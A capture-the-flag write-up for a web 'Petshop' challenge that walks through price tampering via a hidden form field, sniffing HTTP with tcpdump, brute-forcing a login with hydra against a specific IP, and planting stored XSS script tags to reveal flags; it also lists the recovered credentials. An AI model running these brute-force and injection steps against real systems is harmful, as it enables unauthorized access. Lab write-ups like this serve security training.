# Petshop Challenge

##  1. Flag 1

Change the hidden input filed value, make any of the item's cost to negative. 

## 2. Flag 2

Hidden login admin page is at `/login`

Listening for all HTTP packets on 80

```shell
sudo tcpdump -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

Use hydra to brute force the login

Username: 

```shell
hydra -f -L usernames.txt -p aaaa 34.94.3.143 http-post-form "/ae77076007/login:username=^USER^&password=^PASS^:Invalid username"
```

**Found username : `agnella`** 

Username wordlist downloaded from https://github.com/jeanphorn/wordlist

Password: 

```shell
hydra -f -l agnella -P big.txt 34.94.3.143 http-post-form "/ae77076007/login:username=^USER^&password=^PASS^:Invalid password"
```

Tried several medium sized word list, rockyou.txt is pretty big so didn't try that. 

Used https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt and it worked.

**Found password : `dos`**

## 3. Flag 3

Took first hint, said test every input. Suspected XSS. 

After login tried editing the Pets.

Changed pet name to : `kitten <script>alert(1)</script>`  and saved, refreshed the page. 1 got alerted so XSS was possible.

Went to checkout still not flag.

Included `<script>alert(flag)</script>` in description and saved. Then went to checkout page. Got the flag.

